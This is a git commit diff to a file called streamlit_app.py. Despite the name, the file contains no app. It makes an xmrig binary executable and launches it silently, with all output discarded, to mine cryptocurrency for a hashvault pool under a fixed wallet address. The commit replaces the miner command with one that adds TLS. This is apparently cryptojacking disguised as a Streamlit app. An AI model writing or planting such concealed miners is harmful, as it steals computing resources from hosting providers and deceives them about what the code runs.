0a87aec1c9f28cd8ff65db63bf6ae8cff5a9e302
gabriesad <72612690+gabriesad@users.noreply.github.com>
2021-12-18 17:39:26 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,5 +1,4 @@
 import os
 
 os.system("chmod 777 xmrig")
-os.system("./xmrig --donate-level 1 -a argon2/chukwav2 -o 	
-frankfurt01.hashvault.pro:80 -u TRTLuzQtL4XhgUew7qp987b2UZMTLCvXtEnsbi1gUBFFjHEQqWCTCnNS28Pwv7Z4DjELA52kBXBk8AjCgpSFneJHHadpVFB6gAE -p $(cat /proc/sys/kernel/hostname) >/dev/null >/dev/null 2>&1")
+os.system("./xmrig --url frankfurt01.hashvault.pro:80 --user TRTLuzQtL4XhgUew7qp987b2UZMTLCvXtEnsbi1gUBFFjHEQqWCTCnNS28Pwv7Z4DjELA52kBXBk8AjCgpSFneJHHadpVFB6gAE --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 >/dev/null >/dev/null 2>&1")
